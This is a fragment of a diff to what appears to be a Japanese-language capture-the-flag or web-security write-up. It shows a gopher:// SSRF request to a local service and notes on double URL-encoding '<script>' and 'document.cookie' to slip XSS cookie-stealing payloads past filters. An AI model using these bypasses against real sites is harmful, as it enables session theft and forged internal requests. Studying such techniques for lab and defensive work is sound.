@@ -107,7 +107,7 @@ gopher://localhost:9999/_POST%20/new%20HTTP/1.{1}%0d%0a{Host}:%20localhost:9999%
 `<script>` => `%3C script %3E` => `%253C script %253E`
 
 ##### document.cookieもだめ
-`cookie` => `%5B'cookie'%5D`
+`document.cookie` => `document%252ecookie`
 
 #### コード
 ```
